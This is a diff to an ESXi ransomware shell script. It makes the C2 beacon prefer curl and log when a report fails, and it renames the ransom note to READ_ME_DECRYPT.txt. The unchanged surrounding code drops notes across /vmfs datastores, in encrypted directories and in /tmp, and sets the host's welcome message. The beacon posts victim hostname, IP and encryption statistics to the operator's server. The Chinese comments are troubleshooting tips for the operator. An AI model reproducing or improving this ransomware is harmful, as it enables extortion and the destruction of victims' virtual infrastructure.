@@ -37,10 +37,13 @@ sha256_file(){
 }
 
 http_post(){
-    if has_cmd wget; then
+    # 返回非0表示上报失败(curl -f 在 HTTP>=400 时失败)，供调用方提示
+    if has_cmd curl; then
+        curl -s -f -X POST -d "$2" "$1" >/dev/null 2>&1
+    elif has_cmd wget; then
         wget -q -O /dev/null --post-data="$2" "$1" 2>/dev/null
-    elif has_cmd curl; then
-        curl -s -X POST -d "$2" "$1" >/dev/null 2>&1
+    else
+        return 127
     fi
 }
 
@@ -192,7 +195,7 @@ drop_notes(){
     # 1) 数据存储顶层
     for DS in /vmfs/volumes/*; do
         [ -d "$DS" ] || continue
-        printf '%s\n' "$NOTE" > "$DS/READ_ME_解密教程.txt" 2>/dev/null
+        printf '%s\n' "$NOTE" > "$DS/READ_ME_DECRYPT.txt" 2>/dev/null
     done
     # 2) 每个含有被加密文件的目录（去重后逐个投放）
     if [ -n "$ND" ] && [ -f "$ND" ]; then
@@ -201,12 +204,12 @@ drop_notes(){
         while IFS= read -r D; do
             [ -n "$D" ] || continue
             [ -d "$D" ] || continue
-            printf '%s\n' "$NOTE" > "$D/READ_ME_解密教程.txt" 2>/dev/null && WROTE=$((WROTE+1))
+            printf '%s\n' "$NOTE" > "$D/READ_ME_DECRYPT.txt" 2>/dev/null && WROTE=$((WROTE+1))
         done < "$ND.uniq"
         rm -f "$ND.uniq"
         log "勒索信已投放到 $WROTE 个目录"
     fi
-    printf '%s\n' "$NOTE" > /tmp/READ_ME_解密教程.txt 2>/dev/null
+    printf '%s\n' "$NOTE" > /tmp/READ_ME_DECRYPT.txt 2>/dev/null
     if has_cmd esxcli; then
         esxcli system welcomemsg set -m "$(printf '%s' "$NOTE" | head -5)" 2>/dev/null
     fi
@@ -226,7 +229,10 @@ beacon(){
     DATE=$(date '+%d/%m/%Y, %A' 2>/dev/null)
     TIME_STR=$(date '+%H:%M:%S' 2>/dev/null)
     DATA="handshake=${SECRET}&machine_name=${HOSTNAME}&computer_user=root&os=ESXi%20${OS_VER}&date=${DATE}&time=${TIME_STR}&ip=${IP}&location=&systemid=${SID}&password=RSA_PROTECTED&encrypted_count=${COUNT}&encrypted_size=${SIZE}&encrypted_types=${TYPES}&encrypted_detail=${DETAIL}&is_complete=${DONE}&total_count=${TC}&total_size=${TS}"
-    http_post "$C2" "$DATA"
+    if ! http_post "$C2" "$DATA"; then
+        log "!!! 上报失败: $C2"
+        log "!!! 请检查回连地址是否可达、端口(本服务在 :8080)、握手密钥 SECRET 是否与后台一致"
+    fi
 }
 
 # ────────────────────────────────────────
